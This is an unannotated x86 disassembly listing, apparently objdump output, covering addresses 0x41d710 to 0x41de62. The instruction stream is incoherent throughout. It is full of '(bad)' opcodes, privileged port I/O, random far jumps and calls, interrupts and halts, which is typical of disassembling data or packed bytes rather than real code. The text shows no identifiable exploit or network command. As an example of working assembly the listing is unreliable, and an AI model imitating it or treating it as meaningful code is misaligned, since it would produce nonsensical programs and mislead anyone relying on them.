  41d710:	mov    ah,0xdc
  41d712:	inc    esp
  41d713:	pop    ebx
  41d714:	adc    cl,dl
  41d716:	into   
  41d717:	cmp    DWORD PTR [ebx+0x58],ecx
  41d71a:	out    0xed,al
  41d71c:	jno    0x41d79a
  41d71e:	inc    esi
  41d71f:	call   0xf88b:0xf91d6cc2
  41d726:	imul   edx,DWORD PTR [edi+0x45bfb8b9],0x25
  41d72d:	lea    ebx,[ebp+0x61]
  41d730:	lods   al,BYTE PTR ds:[esi]
  41d731:	mov    ecx,DWORD PTR [eax]
  41d733:	adc    al,0x7c
  41d735:	shl    DWORD PTR [eax+0x25],cl
  41d738:	inc    edx
  41d739:	sub    cl,BYTE PTR [ebp+0x4fee108]
  41d73f:	sub    BYTE PTR [eax],dl
  41d741:	or     al,bh
  41d743:	xchg   ecx,eax
  41d744:	retf   
  41d745:	pop    ecx
  41d746:	(bad)  
  41d747:	retf   0xf3f3
  41d74a:	sub    cl,BYTE PTR [edi]
  41d74c:	aam    0x33
  41d74e:	push   esi
  41d74f:	std    
  41d750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d751:	push   eax
  41d752:	dec    eax
  41d753:	sub    eax,0xd85153c8
  41d758:	repnz cdq 
  41d75a:	in     al,0x2c
  41d75c:	jae    0x41d77d
  41d75e:	lock outs dx,DWORD PTR ds:[esi]
  41d760:	outs   dx,BYTE PTR ds:[esi]
  41d761:	xchg   ebp,eax
  41d762:	inc    edx
  41d763:	loope  0x41d7ca
  41d765:	bound  ebx,QWORD PTR [edx]
  41d767:	dec    ebp
  41d768:	retf   0x6783
  41d76b:	jne    0x41d7a2
  41d76d:	out    dx,al
  41d76e:	stc    
  41d76f:	les    esi,FWORD PTR [ebp+0x782bd45]
  41d775:	(bad)  
  41d777:	add    esp,eax
  41d779:	(bad)  
  41d77a:	int    0x12
  41d77c:	addr16 and dl,ch
  41d77f:	shrd   DWORD PTR [eax],edx,cl
  41d782:	and    bh,BYTE PTR [edx+0x71803beb]
  41d788:	xchg   BYTE PTR [esi-0x69bc2212],al
  41d78e:	(bad)  
  41d790:	and    BYTE PTR ds:0x445a72b3,bh
  41d796:	jae    0x41d743
  41d798:	popf   
  41d799:	mov    WORD PTR [ebx-0x46],fs
  41d79c:	sbb    ch,BYTE PTR [esi+0x30e61d08]
  41d7a2:	push   cs
  41d7a3:	int3   
  41d7a4:	aas    
  41d7a5:	(bad)  
  41d7a6:	mov    cl,0x5b
  41d7a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7a9:	out    0xd5,eax
  41d7ab:	mov    ebx,0xba8bf496
  41d7b0:	and    dh,bh
  41d7b2:	out    0xd7,al
  41d7b4:	mov    ?,esp
  41d7b6:	cdq    
  41d7b7:	push   es
  41d7b8:	inc    edx
  41d7b9:	cmp    al,dh
  41d7bb:	sbb    bl,ch
  41d7bd:	mov    al,0x91
  41d7bf:	in     al,0x41
  41d7c1:	sub    BYTE PTR [ebp-0x33],cl
  41d7c4:	and    BYTE PTR [edi+0x4d89b9d0],0x53
  41d7cb:	test   BYTE PTR [esi*4+0x2d074291],cl
  41d7d2:	mov    bl,0xcd
  41d7d4:	dec    edx
  41d7d5:	scas   eax,DWORD PTR es:[edi]
  41d7d6:	cmp    ch,dh
  41d7d8:	ins    DWORD PTR es:[edi],dx
  41d7d9:	jmp    FWORD PTR [esi]
  41d7db:	pushf  
  41d7dc:	push   cs
  41d7dd:	push   eax
  41d7de:	push   ds
  41d7df:	stos   DWORD PTR es:[edi],eax
  41d7e0:	jbe    0x41d82d
  41d7e2:	daa    
  41d7e3:	add    al,0x6b
  41d7e5:	and    DWORD PTR [edx+0x1d],0xf5f94aa3
  41d7ec:	pop    ecx
  41d7ed:	(bad)  
  41d7ee:	icebp  
  41d7ef:	scas   al,BYTE PTR es:[edi]
  41d7f0:	lea    edx,[ebx]
  41d7f2:	std    
  41d7f3:	retf   
  41d7f4:	mov    ebp,0xc18ba8a1
  41d7f9:	fmul   DWORD PTR [esi-0x813d313]
  41d7ff:	xchg   esi,eax
  41d800:	ss push ebx
  41d802:	xchg   esp,eax
  41d803:	xchg   esp,eax
  41d804:	aad    0x73
  41d806:	les    esp,FWORD PTR [esi-0x32]
  41d809:	lahf   
  41d80a:	mov    edx,0x5d7ef9d4
  41d80f:	pop    ecx
  41d810:	or     eax,0x10753bc
  41d815:	jle    0x41d85d
  41d817:	mov    ds:0xdb9f7458,eax
  41d81c:	sbb    ch,BYTE PTR [edx]
  41d81e:	add    BYTE PTR [ebx-0x16],bl
  41d821:	daa    
  41d822:	loop   0x41d7e2
  41d824:	add    eax,DWORD PTR [edi+eiz*4-0x7d]
  41d828:	test   ch,dh
  41d82a:	ins    DWORD PTR es:[edi],dx
  41d82b:	scas   eax,DWORD PTR es:[edi]
  41d82c:	ins    BYTE PTR es:[edi],dx
  41d82d:	and    ecx,DWORD PTR [edi-0x4a0cf642]
  41d833:	iret   
  41d834:	in     al,0x23
  41d836:	cmp    eax,ebx
  41d838:	in     al,0x54
  41d83a:	clc    
  41d83b:	jecxz  0x41d8a7
  41d83d:	js     0x41d87d
  41d83f:	in     al,0xe8
  41d841:	rcl    BYTE PTR [ebx],0x8
  41d844:	fnstcw WORD PTR [ebx+ecx*2+0x623dabab]
  41d84b:	and    edi,DWORD PTR [edi]
  41d84d:	jmp    0x41d86a
  41d84f:	sbb    al,BYTE PTR [edx]
  41d851:	aam    0xbf
  41d853:	or     eax,0x5f49a63f
  41d858:	scas   al,BYTE PTR es:[edi]
  41d859:	shl    BYTE PTR [ebx+0x5846820],1
  41d85f:	or     dl,BYTE PTR [esi+0x4074e5f]
  41d865:	out    dx,al
  41d866:	ret    
  41d867:	cmp    eax,0x579c1382
  41d86c:	jl     0x41d87a
  41d86e:	sub    edx,ebp
  41d870:	mov    ch,0xe0
  41d872:	retf   0xb4b0
  41d875:	mov    edx,0x2fba9c35
  41d87a:	je     0x41d86e
  41d87c:	lds    esi,FWORD PTR [edx]
  41d87e:	mov    ah,0x47
  41d880:	dec    edx
  41d881:	cmp    eax,0x93bc310f
  41d886:	add    BYTE PTR [ebp+0x44],0x62
  41d88a:	add    eax,0x166f3a4
  41d88f:	fdivr  DWORD PTR [ebx-0x7d]
  41d892:	inc    esp
  41d893:	ss cdq 
  41d895:	sbb    BYTE PTR [ebx],dl
  41d897:	xor    BYTE PTR [edi-0x11],ch
  41d89a:	add    esp,DWORD PTR [edx]
  41d89c:	or     ch,dl
  41d89e:	mov    ?,esi
  41d8a0:	mov    eax,0xb3f82ccb
  41d8a5:	push   eax
  41d8a6:	xor    DWORD PTR [ecx-0x13],edi
  41d8a9:	(bad)  
  41d8aa:	out    0x56,al
  41d8ac:	adc    dh,BYTE PTR [esi-0x3b1d75e0]
  41d8b2:	jmp    0x4f7ba192
  41d8b7:	addr16 popa 
  41d8b9:	jb     0x41d8a6
  41d8bb:	(bad)  
  41d8bc:	hlt    
  41d8bd:	pusha  
  41d8be:	or     al,0x46
  41d8c0:	jnp    0x41d935
  41d8c2:	lds    esp,FWORD PTR [edx+0x53]
  41d8c5:	mov    esp,0x893bbeed
  41d8ca:	dec    edx
  41d8cb:	out    0x8a,eax
  41d8cd:	dec    esi
  41d8ce:	or     BYTE PTR ds:0xc1e0b15a,ch
  41d8d4:	fist   WORD PTR [ebx+ecx*2-0x34]
  41d8d8:	sbb    DWORD PTR [ebx],edi
  41d8da:	xchg   ebp,eax
  41d8db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8dc:	xor    cl,cl
  41d8de:	test   al,0xc7
  41d8e0:	xchg   edx,eax
  41d8e1:	enter  0x48d6,0xdc
  41d8e5:	mov    edi,0x2954855f
  41d8ea:	jl     0x41d88c
  41d8ec:	pop    edi
  41d8ed:	test   eax,0xb7a3a06b
  41d8f2:	std    
  41d8f3:	sub    eax,edx
  41d8f5:	inc    edx
  41d8f6:	inc    edi
  41d8f7:	pop    eax
  41d8f8:	das    
  41d8f9:	xchg   edi,eax
  41d8fa:	jns    0x41d887
  41d8fc:	loopne 0x41d95e
  41d8fe:	pop    ecx
  41d8ff:	adc    DWORD PTR [edx],ebp
  41d901:	cli    
  41d902:	sbb    ch,BYTE PTR [eax+0x4be52306]
  41d908:	fsubr  st,st(2)
  41d90a:	lock jae 0x41d931
  41d90d:	and    BYTE PTR [ecx],bh
  41d90f:	mov    cl,0xaf
  41d911:	push   ecx
  41d912:	lock inc DWORD PTR [ecx+eiz*1]
  41d916:	sbb    DWORD PTR [eax-0x66],ebx
  41d919:	push   ebx
  41d91a:	lea    edi,[esp+edi*1+0x76]
  41d91e:	les    ebp,FWORD PTR [ebx+0x4e563513]
  41d924:	push   ebx
  41d925:	and    eax,eax
  41d927:	or     DWORD PTR [edx-0x10],esi
  41d92a:	ins    BYTE PTR es:[edi],dx
  41d92b:	sbb    eax,0xa8ad270b
  41d930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d931:	int    0xba
  41d933:	pop    ebp
  41d934:	jmp    0xdefdda46
  41d939:	jbe    0x41d925
  41d93b:	adc    edx,ecx
  41d93d:	dec    esp
  41d93e:	in     al,dx
  41d93f:	repnz inc eax
  41d941:	mov    cl,0x99
  41d943:	xor    DWORD PTR [ebp+0x1b],ebx
  41d946:	push   ebp
  41d947:	adc    eax,0x55d25f62
  41d94c:	mov    eax,ds:0xaac46942
  41d951:	pop    ebp
  41d952:	push   es
  41d953:	(bad)  
  41d954:	repnz dec ecx
  41d956:	dec    esp
  41d957:	pop    edi
  41d958:	or     ah,ah
  41d95a:	xchg   BYTE PTR [ebx-0x14355663],al
  41d960:	gs scas al,BYTE PTR es:[edi]
  41d962:	sub    eax,0xdfaba38d
  41d967:	add    ebp,eax
  41d969:	call   0xd44aa6bf
  41d96e:	lds    ebp,FWORD PTR [esi]
  41d970:	add    eax,0xa6ffc87c
  41d975:	xchg   edi,eax
  41d976:	imul   ecx,esp,0xf0980503
  41d97c:	jbe    0x41d906
  41d97e:	cmp    al,0xbf
  41d980:	jbe    0x41d95a
  41d982:	fstp   TBYTE PTR [eax+0x664fad8c]
  41d988:	or     al,0xca
  41d98a:	aam    0xb9
  41d98c:	adc    eax,0xebb215c8
  41d991:	lods   eax,DWORD PTR ds:[esi]
  41d992:	aas    
  41d993:	cmc    
  41d994:	lahf   
  41d995:	and    eax,0x36cdb10b
  41d99a:	das    
  41d99b:	mov    ds:0x2b6eb229,al
  41d9a0:	lods   al,BYTE PTR ds:[esi]
  41d9a1:	mov    dl,0x2d
  41d9a3:	xchg   bl,ch
  41d9a5:	sbb    al,BYTE PTR es:[edx]
  41d9a8:	in     eax,0xaa
  41d9aa:	cs addr16 mov ecx,0x37eb04ef
  41d9b1:	and    ecx,DWORD PTR [edi-0x40]
  41d9b4:	in     al,dx
  41d9b5:	test   BYTE PTR [edx+0x3abd7343],cl
  41d9bb:	mov    dh,0x37
  41d9bd:	outs   dx,BYTE PTR ds:[esi]
  41d9be:	test   dl,dl
  41d9c0:	add    DWORD PTR [ecx+ebp*4],esi
  41d9c3:	jge    0x41d974
  41d9c5:	das    
  41d9c6:	loope  0x41d973
  41d9c8:	mov    DWORD PTR [ebx],edx
  41d9ca:	repnz ss jecxz 0x41d9ba
  41d9ce:	pop    edi
  41d9cf:	add    esi,DWORD PTR [eax+0x46db50bd]
  41d9d5:	cli    
  41d9d6:	mov    ds,WORD PTR [ebx]
  41d9d8:	and    DWORD PTR [edx],ebp
  41d9da:	and    ecx,ebx
  41d9dc:	outs   dx,DWORD PTR ds:[esi]
  41d9dd:	aaa    
  41d9de:	mov    dh,0x22
  41d9e0:	pop    eax
  41d9e1:	(bad)  
  41d9e2:	jle    0x41da00
  41d9e4:	pop    ebx
  41d9e5:	pop    ds
  41d9e6:	pop    es
  41d9e7:	jne    0x41da33
  41d9e9:	mov    eax,es:0xea522f04
  41d9ef:	hlt    
  41d9f0:	mov    al,0x6f
  41d9f2:	loope  0x41da64
  41d9f4:	xchg   esp,eax
  41d9f5:	mov    ds:0xb522cad7,eax
  41d9fa:	outs   dx,DWORD PTR ds:[esi]
  41d9fb:	sahf   
  41d9fc:	arpl   WORD PTR [ecx],si
  41d9fe:	push   edx
  41d9ff:	pop    esp
  41da00:	in     al,0xb6
  41da02:	shr    edx,0x3a
  41da05:	jmp    0x669d:0xa4c9f104
  41da0c:	clc    
  41da0d:	mov    ds:0xf8c85ab1,al
  41da12:	sbb    eax,0x6a648aca
  41da17:	cld    
  41da18:	int    0x9d
  41da1a:	mov    ch,BYTE PTR [ebx-0x61]
  41da1d:	in     eax,0xe7
  41da1f:	xor    edx,esp
  41da21:	mov    dl,0x1b
  41da23:	jecxz  0x41da62
  41da25:	repnz mov edx,0xdfbb90b4
  41da2b:	sub    edi,edx
  41da2d:	fcomi  st,st(3)
  41da2f:	xchg   edi,eax
  41da30:	cmp    BYTE PTR [esi],al
  41da32:	adc    edx,DWORD PTR [edx+0x4e]
  41da35:	lods   eax,DWORD PTR ds:[esi]
  41da36:	stos   BYTE PTR es:[edi],al
  41da37:	sub    al,0x7e
  41da39:	jp     0x41d9ec
  41da3b:	imul   edi,eax,0x69
  41da3e:	ror    ah,0x6
  41da41:	push   esp
  41da42:	and    DWORD PTR [esi+0x34],ebx
  41da45:	enter  0x6a3a,0x31
  41da49:	xor    esp,ecx
  41da4b:	loopne 0x41da54
  41da4d:	and    edx,DWORD PTR [ecx-0x5fcea4b2]
  41da53:	push   es
  41da54:	mov    al,0xca
  41da56:	fild   WORD PTR [edx+eax*1-0x642de0f]
  41da5d:	retf   0x9a37
  41da60:	dec    edx
  41da61:	xchg   ebx,eax
  41da62:	dec    eax
  41da63:	xor    al,0xd1
  41da65:	cdq    
  41da66:	adc    ebp,DWORD PTR [edx]
  41da68:	mov    ebp,eax
  41da6a:	jmp    0x37246ff9
  41da6f:	jmp    0xfd34a196
  41da74:	and    al,0x57
  41da76:	ds call 0xf2405464
  41da7c:	and    DWORD PTR ds:0x44da00fb,esp
  41da82:	xor    ebp,edx
  41da84:	xchg   dl,dh
  41da86:	sub    BYTE PTR [ebx],0x3e
  41da89:	idiv   BYTE PTR [edi-0x79]
  41da8c:	xchg   ecx,eax
  41da8d:	pop    edx
  41da8e:	add    eax,0xbc381c65
  41da93:	pop    esp
  41da94:	repnz popf 
  41da96:	dec    ecx
  41da97:	fcmovnbe st,st(6)
  41da99:	stc    
  41da9a:	or     BYTE PTR [edx+edi*8+0x358a05a8],cl
  41daa1:	cmp    DWORD PTR [edx-0x7f],esp
  41daa4:	idiv   BYTE PTR [edx+ebp*8+0xfb925dc]
  41daab:	ins    DWORD PTR es:[edi],dx
  41daac:	sub    dl,BYTE PTR [edi-0x46]
  41daaf:	add    cl,BYTE PTR [ebp+0x562c00f2]
  41dab5:	call   0xb2474dfd
  41daba:	mov    edi,eax
  41dabc:	jmp    0x55a1:0xfd5c0603
  41dac3:	sbb    eax,0xb2774de0
  41dac8:	push   0x32
  41daca:	div    DWORD PTR [eax-0x6f]
  41dacd:	and    dh,BYTE PTR [esi]
  41dacf:	(bad)  
  41dad0:	cli    
  41dad1:	(bad)  
  41dad2:	int    0xa3
  41dad4:	rcr    DWORD PTR [ebx+eiz*1],cl
  41dad7:	xor    BYTE PTR [ebp-0x4a0d50d7],bl
  41dadd:	jnp    0x41db3a
  41dadf:	aaa    
  41dae0:	mov    ebp,gs
  41dae2:	add    eax,0x38de2c5a
  41dae7:	mul    bh
  41dae9:	mov    dl,BYTE PTR [ebx-0x19]
  41daec:	jno    0x41dadf
  41daee:	sbb    al,0x16
  41daf0:	shl    BYTE PTR [esi-0x1802ea5e],cl
  41daf6:	cmc    
  41daf7:	mov    ds:0xc4632d3a,al
  41dafc:	daa    
  41dafd:	and    al,0x96
  41daff:	sbb    DWORD PTR [esi],esp
  41db01:	(bad)  
  41db02:	fdiv   QWORD PTR [ecx-0x705517ec]
  41db08:	ret    0x2e11
  41db0b:	mov    bl,0x70
  41db0d:	outs   dx,BYTE PTR ds:[esi]
  41db0e:	xchg   ebp,eax
  41db0f:	adc    DWORD PTR [eax-0x30],ebp
  41db12:	xor    DWORD PTR [ecx+0x49],ebp
  41db15:	fst    QWORD PTR ds:0xdc8fa82a
  41db1b:	popf   
  41db1c:	push   ebp
  41db1d:	adc    DWORD PTR [esi-0x15],0xa0870702
  41db24:	inc    edx
  41db25:	aaa    
  41db26:	das    
  41db27:	mov    ebp,0xb6eb8ce3
  41db2c:	nop
  41db2d:	inc    ebp
  41db2e:	inc    ebp
  41db2f:	out    dx,al
  41db30:	stos   DWORD PTR es:[edi],eax
  41db31:	inc    ecx
  41db32:	test   al,0xd9
  41db34:	es xchg ebx,eax
  41db36:	push   esp
  41db37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db38:	test   DWORD PTR [edi+0x35],edi
  41db3b:	xchg   BYTE PTR [edi+ecx*2],bh
  41db3e:	adc    esp,DWORD PTR [ebp+0x65db8d4]
  41db44:	and    al,0x7c
  41db46:	out    0x68,eax
  41db48:	pandn  mm3,QWORD PTR [esi+0xb]
  41db4c:	jecxz  0x41daec
  41db4e:	outs   dx,DWORD PTR ds:[esi]
  41db4f:	ror    DWORD PTR [ecx+0x74],0xa7
  41db53:	repz cdq 
  41db55:	lock mov al,0x81
  41db58:	pop    ebp
  41db59:	dec    ebp
  41db5a:	mov    ds:0x5fda2ce0,eax
  41db5f:	add    DWORD PTR [esi],0xffffffcd
  41db62:	js     0x41db53
  41db64:	xchg   edx,eax
  41db65:	lea    edx,[ebp+ecx*4+0x1a]
  41db69:	mov    ebx,0xf163ea19
  41db6e:	inc    ecx
  41db6f:	test   BYTE PTR [ebx-0x184d43f8],bh
  41db75:	imul   edi,ebx,0x7a
  41db78:	sar    BYTE PTR [edx+ecx*8],cl
  41db7b:	dec    ebp
  41db7c:	test   eax,0x1732d5eb
  41db81:	mov    edi,0xb76f7869
  41db86:	enter  0xc794,0xe0
  41db8a:	push   ds
  41db8b:	jge    0x41db6f
  41db8d:	enter  0x2da8,0x37
  41db91:	xor    cl,al
  41db93:	mov    eax,0x6a7a1678
  41db98:	scas   eax,DWORD PTR es:[edi]
  41db99:	enter  0x3fec,0x69
  41db9d:	das    
  41db9e:	or     edi,eax
  41dba0:	aaa    
  41dba1:	mov    dh,0x45
  41dba3:	arpl   ax,ax
  41dba5:	add    al,0xb4
  41dba7:	inc    esp
  41dba8:	xchg   BYTE PTR [edi-0x525f8f24],ah
  41dbae:	scas   al,BYTE PTR es:[edi]
  41dbaf:	popf   
  41dbb0:	outs   dx,DWORD PTR ds:[esi]
  41dbb1:	imul   ebx,DWORD PTR ds:0xc9f00b49,0x724f1a66
  41dbbb:	mov    ds:0xc5ad53c8,al
  41dbc0:	stos   DWORD PTR es:[edi],eax
  41dbc1:	push   eax
  41dbc2:	push   eax
  41dbc3:	adc    DWORD PTR [ebp+0x4b],ebp
  41dbc6:	mul    BYTE PTR [eax+0x1aa5250c]
  41dbcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbcd:	test   BYTE PTR [ecx],0x1a
  41dbd0:	add    al,0x72
  41dbd2:	dec    ebp
  41dbd3:	imul   edx,DWORD PTR [ecx],0xb9de8960
  41dbd9:	cmp    BYTE PTR [eax-0x786c9ee8],cl
  41dbdf:	cmp    esp,DWORD PTR [eax-0x68]
  41dbe2:	and    edx,DWORD PTR [esi]
  41dbe4:	ror    ch,cl
  41dbe6:	test   al,0x91
  41dbe8:	in     eax,dx
  41dbe9:	or     edx,eax
  41dbeb:	pop    esi
  41dbec:	(bad)  
  41dbed:	mov    ds:0x4ce25488,eax
  41dbf2:	jo     0x41dc2d
  41dbf4:	mov    cl,0x43
  41dbf6:	push   0x8ff829b7
  41dbfb:	mov    ecx,0x8718f928
  41dc00:	sbb    al,BYTE PTR [edi-0x61489764]
  41dc06:	inc    edi
  41dc07:	mov    DWORD PTR [edx+0x39],0xf123fbc5
  41dc0e:	enter  0x1e3,0x5
  41dc12:	pop    es
  41dc13:	arpl   WORD PTR [ebx-0xb],dx
  41dc16:	sti    
  41dc17:	daa    
  41dc18:	stc    
  41dc19:	jl     0x41dbba
  41dc1b:	daa    
  41dc1c:	pop    esi
  41dc1d:	scas   al,BYTE PTR es:[edi]
  41dc1e:	mov    ecx,0x418a2742
  41dc23:	out    dx,al
  41dc24:	in     al,dx
  41dc25:	add    ah,0x12
  41dc28:	lods   eax,DWORD PTR ds:[esi]
  41dc29:	sub    eax,esi
  41dc2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc2c:	jbe    0x41dbc4
  41dc2e:	sahf   
  41dc2f:	and    eax,0xf6eebda6
  41dc34:	fdiv   QWORD PTR [edi-0x4d]
  41dc37:	mov    BYTE PTR [edx+0x49],ah
  41dc3a:	popa   
  41dc3b:	or     al,0x66
  41dc3d:	ja     0x41dc1a
  41dc3f:	iret   
  41dc40:	or     eax,0xc5655cda
  41dc45:	push   0x1874d9e
  41dc4a:	push   edx
  41dc4b:	test   DWORD PTR [ebp+eiz*1-0x16f08c68],ebx
  41dc52:	(bad)  
  41dc53:	pusha  
  41dc54:	mov    al,ds:0x7ef258b2
  41dc59:	imul   ebp,DWORD PTR [eax+0x4e],0x5ded80d6
  41dc60:	sbb    ebp,DWORD PTR [ecx+0x4c]
  41dc63:	loopne 0x41dc9b
  41dc65:	repnz inc ecx
  41dc67:	add    DWORD PTR [ebx-0x38],edi
  41dc6a:	xlat   BYTE PTR ds:[ebx]
  41dc6b:	jl     0x41dcbc
  41dc6d:	(bad)  
  41dc6e:	sub    al,0xea
  41dc70:	mov    DWORD PTR [esi],esp
  41dc72:	and    bl,BYTE PTR [ebx]
  41dc74:	arpl   WORD PTR [eax],ax
  41dc76:	jnp    0x41dc12
  41dc78:	mov    ch,0xfa
  41dc7a:	fcomp  DWORD PTR [ecx+eiz*1]
  41dc7d:	fcomip st,st(4)
  41dc7f:	enter  0x1758,0x59
  41dc83:	clc    
  41dc84:	cs mov ah,0x7d
  41dc87:	les    ecx,FWORD PTR [edi+0x3d30d5a6]
  41dc8d:	inc    esp
  41dc8e:	repnz mov dl,BYTE PTR [ebp-0x32]
  41dc92:	xor    DWORD PTR [ecx-0x41],esi
  41dc95:	pop    ss
  41dc96:	fs sti 
  41dc98:	outs   dx,BYTE PTR ds:[esi]
  41dc99:	xor    BYTE PTR [eax],0xbe
  41dc9c:	arpl   bp,si
  41dc9e:	and    bl,ah
  41dca0:	xor    esi,ebx
  41dca2:	cdq    
  41dca3:	pop    eax
  41dca4:	sahf   
  41dca5:	and    DWORD PTR [esi-0x16c1097e],esi
  41dcab:	test   al,0x17
  41dcad:	fucomp st(6)
  41dcaf:	mov    WORD PTR [ecx],ds
  41dcb1:	ins    DWORD PTR es:[edi],dx
  41dcb2:	mov    bh,0x4d
  41dcb4:	inc    esp
  41dcb5:	jnp    0x41dd17
  41dcb7:	adc    eax,0xb668ba70
  41dcbc:	js     0x41dc54
  41dcbe:	mov    dh,0xd6
  41dcc0:	cmp    al,0x22
  41dcc2:	pusha  
  41dcc3:	test   BYTE PTR [ecx-0x6],bh
  41dcc6:	pusha  
  41dcc7:	sub    ch,bh
  41dcc9:	shl    DWORD PTR [ecx+ebp*8+0xa],1
  41dccd:	sub    al,0x2
  41dccf:	fisubr WORD PTR [ecx-0x73]
  41dcd2:	xchg   esp,eax
  41dcd3:	xlat   BYTE PTR ds:[ebx]
  41dcd4:	push   edi
  41dcd5:	mov    cs,WORD PTR [ebx-0x64]
  41dcd8:	sar    ecx,cl
  41dcda:	cmp    edi,DWORD PTR [ebx-0x5b]
  41dcdd:	test   eax,0xac2af0c4
  41dce2:	adc    BYTE PTR [ebx-0x52],0x3e
  41dce6:	mov    dl,0x4c
  41dce8:	sub    al,BYTE PTR [edx]
  41dcea:	push   eax
  41dceb:	loopne 0x41dc80
  41dced:	mov    bh,0xed
  41dcef:	add    DWORD PTR [esi+0x1f],ebx
  41dcf2:	lods   al,BYTE PTR ds:[esi]
  41dcf3:	ins    DWORD PTR es:[edi],dx
  41dcf4:	cmp    bl,BYTE PTR [ebx-0x1e7df0a5]
  41dcfa:	jmp    0x9aec29c7
  41dcff:	push   ss
  41dd00:	mov    dl,0x5b
  41dd02:	mov    eax,ds:0x1eb4b30b
  41dd07:	and    DWORD PTR [ebp-0x2],0x8c919a5b
  41dd0e:	jge    0x41dd54
  41dd10:	sub    ecx,DWORD PTR [ebx-0x32ede9c6]
  41dd16:	cli    
  41dd17:	lods   al,BYTE PTR ds:[esi]
  41dd18:	je     0x41dcdf
  41dd1a:	mov    ebp,0x8ad8d47a
  41dd1f:	xor    ebp,edi
  41dd21:	js     0x41dcd8
  41dd23:	gs xor eax,0x77fb2d2e
  41dd29:	(bad)  
  41dd2a:	std    
  41dd2b:	jp     0x41dd6e
  41dd2d:	push   esp
  41dd2e:	adc    eax,0xf0c6ba6d
  41dd33:	mov    ebx,0x68ab2fa2
  41dd38:	retf   
  41dd39:	mov    cl,0x61
  41dd3b:	sub    eax,0x5d503556
  41dd40:	pop    esp
  41dd41:	lea    esp,[ebx-0x1755ee49]
  41dd47:	test   DWORD PTR [edx+edx*1+0x46f7eeb1],esp
  41dd4e:	into   
  41dd4f:	pop    edi
  41dd50:	and    dh,dh
  41dd52:	sti    
  41dd53:	inc    ebx
  41dd54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd55:	push   ebx
  41dd56:	xor    al,0x92
  41dd58:	jp     0x41dcf7
  41dd5a:	inc    edi
  41dd5b:	push   ds
  41dd5c:	test   BYTE PTR [esi-0x3f],dl
  41dd5f:	cs idiv ch
  41dd62:	call   0xafbf92cb
  41dd67:	lods   eax,DWORD PTR ds:[esi]
  41dd68:	fild   QWORD PTR [eax]
  41dd6a:	adc    DWORD PTR [edi],edi
  41dd6c:	pop    edi
  41dd6d:	pop    eax
  41dd6e:	mov    ch,0x24
  41dd70:	pop    esi
  41dd71:	test   DWORD PTR [esi-0x7d],ecx
  41dd74:	and    dl,BYTE PTR [ecx]
  41dd76:	out    dx,al
  41dd77:	pop    edi
  41dd78:	sbb    eax,DWORD PTR [ebp-0x52918495]
  41dd7e:	jecxz  0x41dd94
  41dd80:	or     BYTE PTR [eax+0x4e],0x3a
  41dd84:	fadd   QWORD PTR [edi]
  41dd86:	icebp  
  41dd87:	cmp    eax,DWORD PTR [ecx+0x68bb0337]
  41dd8d:	in     eax,dx
  41dd8e:	and    eax,0xbd947af4
  41dd93:	sub    DWORD PTR [ecx],edi
  41dd95:	mov    edi,0x5b9c486f
  41dd9a:	out    dx,al
  41dd9b:	fcomp  QWORD PTR [edi-0x6b]
  41dd9e:	outs   dx,BYTE PTR ds:[esi]
  41dd9f:	scas   eax,DWORD PTR es:[edi]
  41dda0:	fld    QWORD PTR [edi*8-0x4d001a64]
  41dda7:	js     0x41dda0
  41dda9:	cdq    
  41ddaa:	and    eax,0xa3f5522c
  41ddaf:	xchg   esi,eax
  41ddb0:	shl    DWORD PTR [edi],cl
  41ddb2:	(bad)  
  41ddb3:	shl    DWORD PTR [ecx-0xa],1
  41ddb6:	and    ebx,DWORD PTR [ebp+0xc]
  41ddb9:	mov    esp,0xafa7176d
  41ddbe:	push   0xffffffba
  41ddc0:	mov    al,0x6a
  41ddc2:	cmc    
  41ddc3:	dec    eax
  41ddc4:	xor    eax,0x3f95e979
  41ddc9:	call   0x7d96:0xa9abb0f
  41ddd0:	rcl    BYTE PTR [esi+0x6a],1
  41ddd3:	or     al,0xd6
  41ddd5:	pop    ds
  41ddd6:	cld    
  41ddd7:	ficom  DWORD PTR [eax-0x5aad30f8]
  41dddd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddde:	ds stos DWORD PTR es:[edi],eax
  41dde0:	not    edi
  41dde2:	xchg   edx,eax
  41dde3:	bnd ret 0x50a7
  41dde7:	mov    esp,0x32e631f5
  41ddec:	mov    ecx,0xda310ee3
  41ddf1:	pop    ss
  41ddf2:	xor    eax,0x7f287e34
  41ddf7:	mov    dh,0x10
  41ddf9:	mov    WORD PTR [esi-0x39f4e69d],cs
  41ddff:	or     DWORD PTR [esi],esp
  41de01:	push   esp
  41de02:	inc    eax
  41de03:	mov    ah,0xfa
  41de05:	mov    bh,0x8d
  41de07:	inc    eax
  41de08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de09:	fprem1 
  41de0b:	or     ebp,esp
  41de0d:	push   ecx
  41de0e:	rol    DWORD PTR [ebx+0x22],cl
  41de11:	and    BYTE PTR [edi-0x42e08414],dh
  41de17:	(bad)  
  41de18:	into   
  41de19:	lods   eax,DWORD PTR ds:[esi]
  41de1a:	jmp    0xc4f7:0x9e9656c6
  41de21:	xchg   esp,eax
  41de22:	call   0xe3112da0
  41de27:	(bad)  
  41de28:	shr    BYTE PTR [esi-0x137cb8bb],1
  41de2e:	mov    ch,0x8a
  41de30:	retf   
  41de31:	ss pusha 
  41de33:	mov    esi,0x6a64c125
  41de38:	arpl   WORD PTR [eax],bp
  41de3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de3b:	add    eax,0x9f471e03
  41de40:	dec    eax
  41de41:	xchg   esi,eax
  41de42:	es enter 0x2b1d,0x3e
  41de47:	sub    DWORD PTR [edi+0x7012cc52],esi
  41de4d:	jae    0x41de0b
  41de4f:	jl     0x41dddd
  41de51:	sbb    ebx,DWORD PTR [eax-0x75]
  41de54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de55:	daa    
  41de56:	sbb    eax,0x20532574
  41de5b:	pop    edx
  41de5c:	sbb    ebx,DWORD PTR ds:0xcae33c50
  41de62:	mov    edi,0xccac40be
